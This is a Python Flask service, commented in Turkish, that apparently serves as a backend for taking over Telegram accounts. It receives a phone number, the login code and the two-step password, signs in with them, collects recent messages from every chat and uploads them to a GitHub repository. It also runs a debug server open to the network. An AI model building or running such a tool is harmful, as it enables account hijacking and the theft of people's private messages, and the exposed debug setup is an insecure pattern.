from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio
import os
import nest_asyncio
import json
import base64
import requests  # GitHub API için requests modülü

# Asenkron işlemler için nest_asyncio'yu etkinleştir
nest_asyncio.apply()

app = Flask(__name__)

# Telegram API bilgileri
api_id = os.getenv('API_ID')  # Environment variable'dan alınır
api_hash = os.getenv('API_HASH')  # Environment variable'dan alınır
session_string = os.getenv('SESSION_STRING')  # StringSession string'i

# GitHub API bilgileri
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')  # GitHub token'ı
REPO_OWNER = os.getenv('REPO_OWNER')  # GitHub kullanıcı adı
REPO_NAME = os.getenv('REPO_NAME')  # Repo adı

# Telethon client oluşturma
client = TelegramClient(StringSession(session_string), api_id, api_hash)

# Kullanıcıdan telefon numarası al ve kod iste
@app.route('/request_code', methods=['POST'])
def request_code():
    phone_number = request.json.get('phone_number')
    if not phone_number:
        return jsonify({"error": "Telefon numarası gereklidir"}), 400

    async def send_code():
        await client.connect()
        await client.send_code_request(phone_number)
        return "Kod gönderildi"

    try:
        loop = asyncio.get_event_loop()
        result = loop.run_until_complete(send_code())
        return jsonify({"message": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Kullanıcıdan kodu al ve oturum aç
@app.route('/submit_code', methods=['POST'])
def submit_code():
    phone_number = request.json.get('phone_number')
    code = request.json.get('code')
    password = request.json.get('password')

    if not phone_number or not code:
        return jsonify({"error": "Telefon numarası ve kod gereklidir"}), 400

    async def sign_in():
        await client.connect()
        try:
            await client.sign_in(phone_number, code)
        except SessionPasswordNeededError:
            if not password:
                return "İki adımlı doğrulama şifresi gereklidir"
            await client.sign_in(password=password)
        return "Oturum açıldı"

    try:
        loop = asyncio.get_event_loop()
        result = loop.run_until_complete(sign_in())
        return jsonify({"message": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Mesajları çek, JSON dosyasına kaydet ve GitHub'a yükle
@app.route('/fetch_messages', methods=['GET'])
def fetch_messages():
    async def fetch():
        if not await client.is_user_authorized():
            return "Oturum açılmamış"

        dialogs = await client.get_dialogs()
        messages = []
        for dialog in dialogs:
            chat_messages = await client.get_messages(dialog.id, limit=5)
            for message in chat_messages:
                messages.append({
                    'chat_name': dialog.name,
                    'sender_id': message.sender_id,
                    'message_text': message.text
                })

        # Mesajları JSON formatında kaydet
        with open('messages.json', 'w', encoding='utf-8') as f:
            json.dump(messages, f, ensure_ascii=False, indent=4)

        # GitHub'a yükle
        github_response = upload_to_github('messages.json')
        return f"Mesajlar JSON dosyasına kaydedildi ve GitHub'a yüklendi: {github_response}"

    try:
        loop = asyncio.get_event_loop()
        result = loop.run_until_complete(fetch())
        return jsonify({"message": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# GitHub'a dosya yükleme fonksiyonu
def upload_to_github(file_path):
    with open(file_path, 'rb') as file:
        file_content = base64.b64encode(file.read()).decode('utf-8')

    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{file_path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "message": "Add messages.json",
        "content": file_content
    }

    response = requests.put(url, json=data, headers=headers)
    if response.status_code == 201:
        return "Dosya GitHub'a başarıyla yüklendi!"
    else:
        return f"Hata: {response.status_code}, {response.json()}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)